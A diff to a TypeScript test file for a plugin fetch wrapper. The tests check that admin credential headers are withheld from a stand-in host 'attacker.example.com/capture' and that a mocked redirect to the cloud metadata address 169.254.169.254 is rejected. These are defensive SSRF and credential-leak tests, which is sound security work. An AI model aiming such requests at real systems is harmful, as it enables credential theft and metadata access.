@@ -179,13 +179,69 @@ describe("buildFetch — admin allowlist + headers", () => {
     expect(headers.get("authorization")).toBe("Bearer admin-override");
   });
 
-  it("no admin headers leaves the request init untouched", async () => {
+  it("no admin headers forwards plugin init with redirect: manual added", async () => {
     const fetch = buildFetch("plug-a", ["api.trakt.tv"]);
     const init = { headers: { "X-Foo": "bar" } };
     await fetch("https://api.trakt.tv/x", init);
-    // The call passed the original init through without wrapping in Headers —
-    // no allocation beyond the plugin's own init.
-    expect(fetchSpy).toHaveBeenCalledWith("https://api.trakt.tv/x", init);
+    // redirect: 'manual' is always set to prevent SSRF via open redirects.
+    // Plugin headers are preserved as-is through the spread.
+    expect(fetchSpy).toHaveBeenCalledWith("https://api.trakt.tv/x", {
+      ...init,
+      redirect: "manual",
+    });
+  });
+
+  it("admin headers are NOT sent when only dynamicAllowed matched (credential leak prevention)", async () => {
+    const fetch = buildFetch("plug-a", [], new Set(["attacker.example.com"]), null, {
+      "X-Corp-Key": "secret-key",
+    });
+    await fetch("https://attacker.example.com/capture", { headers: { "User-Agent": "plugin" } });
+    expect(fetchSpy).toHaveBeenCalledTimes(1);
+    const [, init] = fetchSpy.mock.calls[0]!;
+    const rawHeaders = init!.headers as Record<string, string> | Headers;
+    const secretValue =
+      typeof (rawHeaders as Headers).get === "function"
+        ? (rawHeaders as Headers).get("x-corp-key")
+        : ((rawHeaders as Record<string, string>)["X-Corp-Key"] ??
+          (rawHeaders as Record<string, string>)["x-corp-key"]);
+    expect(secretValue).toBeUndefined();
+  });
+
+  it("admin headers ARE sent when staticAllowed matched", async () => {
+    const fetch = buildFetch("plug-b", ["api.trakt.tv"], undefined, null, {
+      "X-Corp-Key": "secret-key",
+    });
+    await fetch("https://api.trakt.tv/x", {});
+    expect(fetchSpy).toHaveBeenCalledTimes(1);
+    const [, init] = fetchSpy.mock.calls[0]!;
+    const headers = init!.headers as Headers;
+    expect(headers.get("x-corp-key")).toBe("secret-key");
+  });
+});
+
+describe("buildFetch — redirect prevention", () => {
+  beforeEach(() => {
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(
+        async () =>
+          new Response(null, {
+            status: 302,
+            headers: { Location: "http://169.254.169.254/latest/meta-data/" },
+          }),
+      ),
+    );
+  });
+
+  afterEach(() => {
+    vi.unstubAllGlobals();
+  });
+
+  it("throws when upstream returns a redirect", async () => {
+    const fetch = buildFetch("plug-redirect", ["api.example.com"]);
+    await expect(fetch("https://api.example.com/path")).rejects.toMatchObject({
+      code: "plugin.upstream_error",
+    });
   });
 });
 
